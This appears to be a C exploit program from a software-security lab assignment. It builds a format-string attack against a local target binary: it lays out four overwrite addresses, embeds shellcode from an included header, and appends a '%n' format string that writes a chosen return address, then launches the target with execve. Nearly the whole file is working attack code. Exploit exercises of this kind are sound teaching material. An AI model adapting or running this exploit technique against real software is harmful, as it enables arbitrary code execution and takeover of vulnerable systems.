#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define DEFAULT_BUFFER_SIZE  256
#define NOP 0x90
#define ZERO 0x00
int main(void)
{
  char *args[3];
  char *env[1];
  int bsize = DEFAULT_BUFFER_SIZE;
  char* buff, *ptr;	
  
  if(!(buff = (char*)malloc(bsize * sizeof(char)))){
	  printf("can't allocate memory\n");
	  exit(0);	
  }

  unsigned long *add_ptr;
  int i;
  for (i = 0; i < 256; i++){
	  buff[i] = 'A';
  }

  ptr = buff + 60;
 
  /*for (i = 0; i < 5; i++){
    *ptr++ = *s++;
  }
*/
	
  int count = 0;

  char * s = "\x68\xfe\xa4\x40";
  while(*s){
 	 *ptr++ = *s++;
	 count++;
  }
  
  ptr = ptr + 4;
  char* s1 = "\x69\xfe\xa4\x40";
  while(*s1){
 	 *ptr++ = *s1++;
	 count++;
  }
  ptr = ptr + 4;
  char* s2 = "\x70\xfe\xa4\x40";
  while(*s2){
 	 *ptr++ = *s2++;
	 count++;
  }
  ptr = ptr + 4;
  char* s3 = "\x71\xfe\xa4\x40";
  while(*s3){
 	 *(ptr++) = *(s3++);
	 count++;
  }


  ptr = buff + 60 + 28 ;
  for (i=0; i< strlen(shellcode); i++){
  	*(ptr++) = shellcode[i];
	
  }

  ptr = buff + 60 + 28 + strlen(shellcode);
  char* r = "%59x%n%118x%n%170x%n%156x%n";
  while(*r){
 	 *(ptr++) = *(r++);
	 
  }
 

  printf("the length of buff after concatenating is %d\n ",strlen(shellcode));
  printf("the buff after concatenating is %s\n ",buff);
  args[0] = TARGET; 
  args[1] = buff;
  args[2] = NULL;
  
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
